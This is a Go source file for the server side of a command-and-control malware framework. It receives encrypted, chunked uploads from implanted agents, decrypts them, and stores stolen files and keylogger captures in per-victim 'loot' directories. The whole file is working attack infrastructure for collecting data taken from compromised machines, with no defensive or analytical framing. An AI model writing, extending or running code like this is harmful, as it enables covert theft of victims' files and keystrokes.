package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
)

var resultsStore = make(map[string][]Result)
var resultsMu sync.Mutex

// chunkBuffers holds in-flight multi-part results keyed by agent ID.
// Each entry is a slice sized to the chunk total; slots are filled as
// chunks arrive, and the result is processed once every slot is non-empty.
var chunkBuffers = make(map[string][]string)
var chunkMu sync.Mutex

func handleResult(w http.ResponseWriter, r *http.Request, agentID string) {
	heartbeatAgent(agentID)

	raw, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "read error", http.StatusBadRequest)
		return
	}

	total := r.Header.Get("X-Chunk-Total")
	idx := r.Header.Get("X-Chunk-Index")

	// Single-part result: decrypt and process immediately.
	if total == "" || total == "1" {
		decrypted, derr := decryptFromAgent(agentID, string(raw))
		if derr != nil {
			log.Printf("[c2] decrypt error from agent %s: %v", agentID, derr)
			http.Error(w, "decrypt error", http.StatusBadRequest)
			return
		}
		processResult(agentID, []byte(decrypted))
		w.WriteHeader(http.StatusOK)
		return
	}

	// Multi-part result: buffer each encrypted chunk, decrypt only when complete.
	t, _ := strconv.Atoi(total)
	i, _ := strconv.Atoi(idx)
	if t <= 0 {
		decrypted, derr := decryptFromAgent(agentID, string(raw))
		if derr != nil {
			http.Error(w, "decrypt error", http.StatusBadRequest)
			return
		}
		processResult(agentID, []byte(decrypted))
		w.WriteHeader(http.StatusOK)
		return
	}

	complete, full := bufferChunk(agentID, string(raw), i, t)
	if !complete {
		w.WriteHeader(http.StatusOK)
		return
	}

	decrypted, derr := decryptFromAgent(agentID, full)
	if derr != nil {
		log.Printf("[c2] decrypt error (chunked) from agent %s: %v", agentID, derr)
		http.Error(w, "decrypt error", http.StatusBadRequest)
		return
	}
	processResult(agentID, []byte(decrypted))
	w.WriteHeader(http.StatusOK)
}

// bufferChunk stores one encrypted chunk for agentID and returns (complete, full)
// once every slot from 0..total-1 has arrived. full is the concatenation of all
// chunks in order; the caller is responsible for decryption.
func bufferChunk(agentID, raw string, idx, total int) (bool, string) {
	chunkMu.Lock()
	defer chunkMu.Unlock()

	buf := chunkBuffers[agentID]
	if buf == nil {
		buf = make([]string, total)
	}
	if idx >= 0 && idx < total {
		buf[idx] = raw
	}
	chunkBuffers[agentID] = buf

	var full strings.Builder
	complete := true
	for _, c := range buf {
		if c == "" {
			complete = false
			break
		}
		full.WriteString(c)
	}
	if complete {
		delete(chunkBuffers, agentID)
	}
	return complete, full.String()
}

func processResult(agentID string, body []byte) {
	var res Result
	if err := json.Unmarshal(body, &res); err != nil {
		log.Printf("[c2] unmarshal error from agent %s: %v", agentID, err)
		return
	}

	// Store in memory for CLI retrieval
	resultsMu.Lock()
	resultsStore[agentID] = append(resultsStore[agentID], res)
	resultsMu.Unlock()

	// Persist to database
	dbSaveResult(agentID, res)

	// Handle by type
	switch res.Type {
	case "text":
		log.Printf("[c2] text from %s: %s", agentID, res.Data)
	case "file":
		saveFile(agentID, res)
	case "keylog":
		appendKeylog(agentID, res.Data)
	}

	if len(res.Errors) > 0 {
		log.Printf("[c2] errors from %s: %v", agentID, res.Errors)
	}
}

func saveFile(agentID string, res Result) {
	lootDir := filepath.Join("loot", agentID)
	if err := os.MkdirAll(lootDir, 0755); err != nil {
		log.Printf("[c2] mkdir error: %v", err)
		return
	}

	data, err := base64.StdEncoding.DecodeString(res.Data)
	if err != nil {
		log.Printf("[c2] b64 decode error from %s: %v", agentID, err)
		return
	}

	filename := res.Filename
	if filename == "" {
		filename = fmt.Sprintf("file_%d", len(resultsStore[agentID]))
	}
	path := filepath.Join(lootDir, filename)

	if err := os.WriteFile(path, data, 0644); err != nil {
		log.Printf("[c2] write error: %v", err)
		return
	}

	log.Printf("[c2] saved file from %s: %s (%d bytes)", agentID, filename, len(data))
}

func appendKeylog(agentID string, data string) {
	lootDir := filepath.Join("loot", agentID)
	if err := os.MkdirAll(lootDir, 0755); err != nil {
		log.Printf("[c2] mkdir error: %v", err)
		return
	}

	path := filepath.Join(lootDir, "keylogs.txt")
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("[c2] open keylog error: %v", err)
		return
	}
	defer f.Close()

	if _, err := f.WriteString(data); err != nil {
		log.Printf("[c2] write keylog error: %v", err)
		return
	}

	log.Printf("[c2] keylog from %s: %d chars", agentID, len(data))
}

func getResults(agentID string) []Result {
	resultsMu.Lock()
	defer resultsMu.Unlock()
	return resultsStore[agentID]
}
